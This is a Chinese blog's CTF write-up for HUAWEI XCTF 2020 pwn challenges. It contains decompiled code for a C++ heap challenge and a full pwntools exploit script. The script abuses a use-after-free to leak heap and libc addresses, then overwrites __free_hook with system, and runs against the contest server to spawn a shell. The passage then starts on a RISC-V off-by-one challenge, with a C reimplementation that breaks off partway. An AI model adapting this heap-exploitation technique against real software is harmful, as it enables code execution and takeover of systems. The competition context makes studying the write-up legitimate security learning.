<!DOCTYPE html><html lang="zh" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>HUAWEI XCTF 2020 PWN WRITE UP | I0gan</title><meta name="keywords" content="wp"><meta name="author" content="i0gan"><meta name="copyright" content="i0gan"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="HUAWEI XCTF 2020 PWN WRITE UPHUAWEI XCTF 2020 FirstCPPchecksec    Arch:     amd64-64-little     RELRO:    Full RELRO     Stack:    Canary found     NX:       NX enabled     PIE:      PIE enabled Use t">
<meta property="og:type" content="article">
<meta property="og:title" content="HUAWEI XCTF 2020 PWN WRITE UP">
<meta property="og:url" content="http://blog.i0gan.cn/2021/01/08/wp-huawei-xctf-2020/index.html">
<meta property="og:site_name" content="I0gan">
<meta property="og:description" content="HUAWEI XCTF 2020 PWN WRITE UPHUAWEI XCTF 2020 FirstCPPchecksec    Arch:     amd64-64-little     RELRO:    Full RELRO     Stack:    Canary found     NX:       NX enabled     PIE:      PIE enabled Use t">
<meta property="og:locale">
<meta property="og:image" content="http://blog.i0gan.cn/img/text_bg.jpg">
<meta property="article:published_time" content="2021-01-08T06:43:24.000Z">
<meta property="article:modified_time" content="2021-01-08T06:44:24.002Z">
<meta property="article:author" content="i0gan">
<meta property="article:tag" content="wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://blog.i0gan.cn/img/text_bg.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://blog.i0gan.cn/2021/01/08/wp-huawei-xctf-2020/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  ClickShowText: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
};

var saveToLocal = {
  set: function setWithExpiry(key, value, ttl) {
    const now = new Date()
    const expiryDay = ttl * 86400000
    const item = {
      value: value,
      expiry: now.getTime() + expiryDay,
    }
    localStorage.setItem(key, JSON.stringify(item))
  },

  get: function getWithExpiry(key) {
    const itemStr = localStorage.getItem(key)

    if (!itemStr) {
      return undefined
    }
    const item = JSON.parse(itemStr)
    const now = new Date()

    if (now.getTime() > item.expiry) {
      localStorage.removeItem(key)
      return undefined
    }
    return item.value
  }
}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-01-08 14:44:24'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(function () {  window.activateDarkMode = function () {
    document.documentElement.setAttribute('data-theme', 'dark')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
    }
  }
  window.activateLightMode = function () {
    document.documentElement.setAttribute('data-theme', 'light')
   if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
    }
  }
  const autoChangeMode = 'false'
  const t = saveToLocal.get('theme')
  if (autoChangeMode === '1') {
    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
    if (t === undefined) {
      if (isLightMode) activateLightMode()
      else if (isDarkMode) activateDarkMode()
      else if (isNotSpecified || hasNoSupport) {
        const now = new Date()
        const hour = now.getHours()
        const isNight = hour <= 6 || hour >= 18
        isNight ? activateDarkMode() : activateLightMode()
      }
      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
        if (saveToLocal.get('theme') === undefined) {
          e.matches ? activateDarkMode() : activateLightMode()
        }
      })
    } else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else if (autoChangeMode === '2') {
    const now = new Date()
    const hour = now.getHours()
    const isNight = hour <= 6 || hour >= 18
    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
    else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else {
    if (t === 'dark') activateDarkMode()
    else if (t === 'light') activateLightMode()
  }const asideStatus = saveToLocal.get('aside-status')
if (asideStatus !== undefined) {
   if (asideStatus === 'hide') {
     document.documentElement.classList.add('hide-aside')
   } else {
     document.documentElement.classList.remove('hide-aside')
   }
}})()</script><!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/header.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">54</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">27</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">22</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/text_bg.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">I0gan</a></span><span id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">HUAWEI XCTF 2020 PWN WRITE UP</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-01-08T06:43:24.000Z" title="Created 2021-01-08 14:43:24">2021-01-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-01-08T06:44:24.002Z" title="Updated 2021-01-08 14:44:24">2021-01-08</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/wp/">wp</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="HUAWEI-XCTF-2020-PWN-WRITE-UP"><a href="#HUAWEI-XCTF-2020-PWN-WRITE-UP" class="headerlink" title="HUAWEI XCTF 2020 PWN WRITE UP"></a>HUAWEI XCTF 2020 PWN WRITE UP</h1><h1 id="HUAWEI-XCTF-2020-First"><a href="#HUAWEI-XCTF-2020-First" class="headerlink" title="HUAWEI XCTF 2020 First"></a>HUAWEI XCTF 2020 First</h1><h2 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><pre><code>    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled</code></pre>
<p>Use the cutter decompiler to analize this program</p>
<pre class=" language-c++"><code class="language-c++">undefined8 main(void)
{
    int64_t *piVar1;
    int64_t iVar2;
    undefined *arg1;
    undefined *puVar3;
    int64_t in_FS_OFFSET;
    uint64_t uStack40;
    int64_t iStack32;

    iStack32 = *(int64_t *)(in_FS_OFFSET + 0x28);
    setvbuf(_reloc.stdin, 0, 2, 0);
    setvbuf(_reloc.stdout, 0, 2, 0);
    setvbuf(_reloc.stderr, 0, 2, 0);
    uStack40 = 0;
    while( true ) {
        while( true ) {

            std::basic_ostream<char, std::char_traits<char> >& std::__ostream_insert<char, std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*, long)
                      (reloc.std::cout, 0x2004, 2);
            uStack40 = 0x539;
            std::istream& std::istream::_M_extract<unsigned long>(unsigned long&)(reloc.std::cin, &uStack40);
            if (uStack40 != 0) break;
            arg1 = (undefined *)operator new[](unsigned long)(8);
            puVar3 = arg1;
            do {
                *puVar3 = 0;
                puVar3 = puVar3 + 1;
            } while (puVar3 != arg1 + 8);

            std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*)
                      (reloc.std::cout, 0x2004);
            fcn.000012c9((int64_t)arg1, 8);

            std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*)
                      (reloc.std::cout, 0x2004);
            std::istream& std::istream::_M_extract<unsigned long>(unsigned long&)(reloc.std::cin, &uStack40);
            if (uStack40 < 0x100) {
                piVar1 = (int64_t *)(uStack40 * 8 + 0x42e0);
                iVar2 = *piVar1;
                *piVar1 = (int64_t)arg1;
                if (iVar2 != 0) {
                    operator delete[](void*)();
                }
            } else {
                operator delete[](void*)(arg1);
            }
        }
        if (uStack40 != 1) break;

        std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*)
                  (reloc.std::cout, 0x2004);
        std::istream& std::istream::_M_extract<unsigned long>(unsigned long&)(reloc.std::cin, &uStack40);
        if (uStack40 < 0x100) {
            piVar1 = (int64_t *)(uStack40 * 8 + 0x42e0);
            iVar2 = *piVar1;
            *piVar1 = 0;
            if (iVar2 != 0) {
                operator delete[](void*)(iVar2);
                puts(iVar2);

                std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*)
                          (reloc.std::cout, 0x2004);
                fcn.000012c9(iVar2, 8);
            }
        }
    }
    if (iStack32 == *(int64_t *)(in_FS_OFFSET + 0x28)) {
        return 0;
    }
    // WARNING: Subroutine does not return
    __stack_chk_fail();
}
</code></pre>
<p>It’s easy to discover the vulnerability is uaf</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python3</span>
<span class="token comment" spellcheck="true">#-*- coding:utf-8 -*-</span>
<span class="token comment" spellcheck="true"># Author: i0gan</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> os
r   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
ra  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
rl  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
ru  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
s   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
ia  <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
c   <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
li    <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>

context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>

elf_path  <span class="token operator">=</span> <span class="token string">'chall'</span>
<span class="token comment" spellcheck="true">#libc_path = '/glibc/2.23/64/lib/libc.so.6'</span>

<span class="token comment" spellcheck="true"># remote server ip and port</span>
server_ip <span class="token operator">=</span> <span class="token string">"124.70.12.210"</span>
server_port <span class="token operator">=</span> <span class="token number">10002</span>

<span class="token comment" spellcheck="true"># if local debug</span>
LOCAL <span class="token operator">=</span> <span class="token number">0</span>
LIBC  <span class="token operator">=</span> <span class="token number">1</span>
<span class="token comment" spellcheck="true">#--------------------------func-----------------------------</span>
<span class="token keyword">def</span> <span class="token function">db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>LOCAL<span class="token punctuation">)</span><span class="token punctuation">:</span>
        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">fn1</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">fn2</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------exploit--------------------------</span>
<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    li<span class="token punctuation">(</span><span class="token string">'exploit...'</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># leak heap</span>
    fn1<span class="token punctuation">(</span><span class="token string">'123'</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">)</span>
    fn1<span class="token punctuation">(</span><span class="token string">'123'</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">)</span>

    fn2<span class="token punctuation">(</span><span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token string">'AAA'</span><span class="token punctuation">)</span>

    sla<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">0x12</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    leak <span class="token operator">=</span> u64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\x0a'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> b<span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    heap_base <span class="token operator">=</span> leak <span class="token operator">-</span> <span class="token number">0x11eb0</span>
    heap <span class="token operator">=</span> leak
    li<span class="token punctuation">(</span><span class="token string">'leak: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>leak<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true">#li('heap: ' + hex(heap))</span>
    sla<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        fn1<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token number">0x10</span> <span class="token operator">+</span> i<span class="token punctuation">)</span>

    fn2<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'BBBB'</span><span class="token punctuation">)</span>
    fn2<span class="token punctuation">(</span><span class="token number">0x12</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>heap <span class="token operator">+</span> <span class="token number">0x58</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    fn1<span class="token punctuation">(</span><span class="token string">'sh\x00'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
    fn1<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">*</span> <span class="token number">0x25</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>

    sla<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">0x13</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    leak <span class="token operator">=</span> u64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> b<span class="token string">'\x7f\x00\x00'</span><span class="token punctuation">)</span>
    libc_base <span class="token operator">=</span> leak <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">96</span> <span class="token operator">-</span> <span class="token number">0x10</span>
    __free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
    system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
    <span class="token comment" spellcheck="true">#one_gadget = libc_base + </span>
    li<span class="token punctuation">(</span><span class="token string">'leak: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>leak<span class="token punctuation">)</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'libc_base: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>

    fn2<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">'BBBB'</span><span class="token punctuation">)</span>
    fn2<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>__free_hook<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    fn1<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>

    db<span class="token punctuation">(</span><span class="token punctuation">)</span>
    fn1<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">finish</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
    c<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#--------------------------main-----------------------------</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> LOCAL<span class="token punctuation">:</span>
        elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>elf_path<span class="token punctuation">)</span>
        libc_path <span class="token operator">=</span> <span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span>
        <span class="token keyword">if</span> LIBC<span class="token punctuation">:</span>
            libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libc_path<span class="token punctuation">)</span>
            io <span class="token operator">=</span> elf<span class="token punctuation">.</span>process<span class="token punctuation">(</span>env <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"LD_PRELOAD"</span> <span class="token punctuation">:</span> libc_path<span class="token punctuation">}</span> <span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            io <span class="token operator">=</span> elf<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        libc_path <span class="token operator">=</span> <span class="token string">'./libc.so.6'</span>
        elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>elf_path<span class="token punctuation">)</span>
        io <span class="token operator">=</span> remote<span class="token punctuation">(</span>server_ip<span class="token punctuation">,</span> server_port<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIBC<span class="token punctuation">:</span>
            libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libc_path<span class="token punctuation">)</span>
    exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    finish<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<h1 id="HUAWEI-XCTF-2020-Second"><a href="#HUAWEI-XCTF-2020-Second" class="headerlink" title="HUAWEI XCTF 2020 Second"></a>HUAWEI XCTF 2020 Second</h1><h2 id="honorbook"><a href="#honorbook" class="headerlink" title="honorbook"></a>honorbook</h2><p>I’m not good at using gdb to debug this riscv architecture. Because this is the first time I’ve met this architecture. So I use c language to write a same function as this challenge, compile as amd64 arch to debug then analize the layout of heap. The vulnerability is off by one</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;cstdio></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;cstdlib></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>

<span class="token keyword">void</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token function">del</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token function">modify</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">char</span> <span class="token operator">*</span>plist<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">char</span> <span class="token operator">*</span>pname<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> _IONBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> _IONBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

